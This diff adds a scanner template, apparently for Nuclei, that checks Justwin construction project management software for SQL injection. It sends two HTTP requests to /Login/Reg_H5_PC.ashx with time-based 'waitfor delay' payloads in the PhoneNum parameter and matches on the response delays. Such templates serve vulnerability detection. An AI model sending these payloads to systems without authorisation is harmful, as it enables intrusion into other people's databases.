@@ -1,0 +1,40 @@
+id: Justwin-regh5pc-sqli
+
+info:
+  name: Justwin-regh5pc-sqli
+  author: HuanXiong
+  severity: high
+  description: 建文工程项目管理软件Reg_H5_PC存在SQL注入漏洞
+
+  tags: SQL Injection
+
+http:
+  - raw:
+    - |
+      GET /Login/Reg_H5_PC.ashx?PhoneNum=188888888888%27;waitfor%20delay%20%270:0:3%27%20--&method=SendOnlyVaildateCode HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Cookie: ASP.NET_SessionId=yqeom5t4dc5hzqdevkbzococ; LogName=key1=greatWall; zh_choose=es; Language=es
+      Upgrade-Insecure-Requests: 1
+
+    - |
+      GET /Login/Reg_H5_PC.ashx?PhoneNum=188888888888%27;waitfor%20delay%20%270:0:5%27%20--&method=SendOnlyVaildateCode HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+      Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Cookie: ASP.NET_SessionId=yqeom5t4dc5hzqdevkbzococ; LogName=key1=greatWall; zh_choose=es; Language=es
+      Upgrade-Insecure-Requests: 1
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>3 && duration_1<4"
+          - "duration_2>5 && duration_2<6"
